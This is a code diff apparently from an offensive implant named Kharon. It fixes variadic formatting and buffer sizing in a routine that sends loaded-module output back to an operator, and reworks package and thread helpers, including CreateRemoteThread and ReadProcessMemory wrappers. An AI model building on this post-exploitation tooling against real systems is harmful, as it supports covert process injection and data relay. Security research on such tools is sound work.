@@ -43,6 +43,7 @@ auto DECLFN Coff::PrintfW(
     G_KHARON
 
     va_list VaList;
+    va_list VaListCopy;
 
     VOID*  MemRange = __builtin_return_address( 0 );
     CHAR*  UUID     = nullptr;
@@ -51,27 +52,35 @@ auto DECLFN Coff::PrintfW(
     WCHAR* MsgBuff  = nullptr;
 
     va_start( VaList, fmt );
-    MsgSize = Self->Msvcrt.k_vswprintf( nullptr, fmt, VaList );
+    va_copy( VaListCopy, VaList );
+    MsgSize = Self->Msvcrt.k_vscwprintf( fmt, VaList );
     va_end( VaList );
+    
     if ( MsgSize < 0 ) {
-        KhDbg( "Printf: vsnprintf size probe failed" ); goto _KH_END;
+        va_end( VaListCopy );
+        KhDbg( "Printf: vscwprintf size probe failed" ); 
+        goto _KH_END;
     }
 
-    MsgBuff = ( WCHAR* )hAlloc( MsgSize + 1 );
+    MsgBuff = ( WCHAR* )hAlloc( ( MsgSize + 1 ) * sizeof( WCHAR ) );
     if ( !MsgBuff ) {
-        KhDbg( "Printf: allocation failed" ); goto _KH_END;
+        va_end( VaListCopy );
+        KhDbg( "Printf: allocation failed" ); 
+        goto _KH_END;
     }
 
-    va_start( VaList, fmt );
-    written = Self->Msvcrt.k_vswprintf( MsgBuff, fmt, VaList );
-    va_end( VaList );
+    written = Self->Msvcrt.k_vswprintf( MsgBuff, fmt, VaListCopy );
+    va_end( VaListCopy );
+    
     if ( written < 0 ) {
-        KhDbg( "Printf: vsnprintf output failed" ); goto _KH_END;
+        KhDbg( "Printf: vswprintf output failed" ); 
+        goto _KH_END;
     }
-    MsgBuff[written] = '\0'; 
+    
+    MsgBuff[written] = L'\0'; 
 
     UUID = Self->Cf->GetTask( MemRange );
-    KhDbg( "Printf: sending task %s -> \"%s\" [%d bytes]", UUID, MsgBuff, written );
+    KhDbg( "Printf: sending task %s -> \"%ls\" [%d bytes]", UUID, MsgBuff, written * sizeof(WCHAR) );
     Self->Pkg->SendMsgW( type, MsgBuff );
 
 _KH_END:
@@ -374,74 +383,48 @@ auto DECLFN Coff::CreateThread(
 ) -> HANDLE {
     G_KHARON
     
-    return Self->Td->Create( NtCurrentProcess(), Start, Parameter, StackSize, Flags, nullptr, Attributes);
-}
-
-auto DECLFN Coff::PkgCreate(
-    _In_  ULONG     CommandId,
-    _In_  CHAR*     UUID,
-    _Out_ PACKAGE*  Package
-) -> VOID {
-    G_KHARON
-
-    Package = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
-
-    Package->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
-    Package->Length = 0;
-}; 
-
-auto DECLFN Coff::PkgDestroy(
-    _In_ PACKAGE* Package
-) -> VOID {
-    G_KHARON
-
-    return Self->Pkg->Destroy( Package );
+    return Self->Td->Create( NtCurrentProcess(), (PVOID)Start, Parameter, StackSize, Flags, nullptr, Attributes);
 }
 
 auto DECLFN Coff::PkgInt8(
-    _In_ PACKAGE* Package,
-    _In_ BYTE     Data
+    _In_ BYTE Data
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Byte( Package, Data );
+    return Self->Pkg->Byte( Self->Pkg->Shared, Data );
 };
 
 auto DECLFN Coff::PkgInt16(
-    _In_ PACKAGE* Package,
-    _In_ INT16    Data
+    _In_ INT16 Data
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Int16( Package, Data );
+    return Self->Pkg->Int16( Self->Pkg->Shared, Data );
 };
 
 auto DECLFN Coff::PkgInt32(
-    PACKAGE* Package,
     INT32    Data
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Int32( Package, Data );
+    return Self->Pkg->Int32( Self->Pkg->Shared, Data );
 }
 
 auto DECLFN Coff::PkgInt64(
-    PACKAGE* Package,
     INT32    Data
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Int64( Package, Data );
+    return Self->Pkg->Int64( Self->Pkg->Shared, Data );
 }
 
 auto DECLFN Coff::PkgBytes(
-    PACKAGE* Package,
     PBYTE    Buffer,
     ULONG    Length
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Bytes( Package, Buffer, Length );
+    return Self->Pkg->Bytes( Self->Pkg->Shared, Buffer, Length );
 }
 
 auto DECLFN Coff::CreateRemoteThread(
@@ -454,7 +437,7 @@ auto DECLFN Coff::CreateRemoteThread(
 ) -> HANDLE {
     G_KHARON
 
-    return Self->Td->Create( Handle, Start, Parameter, StackSize, Flags, ThreadId, Attributes );
+    return Self->Td->Create( Handle, (PVOID)Start, Parameter, StackSize, Flags, ThreadId, Attributes );
 }
 
 auto DECLFN Coff::ReadProcessMemory(
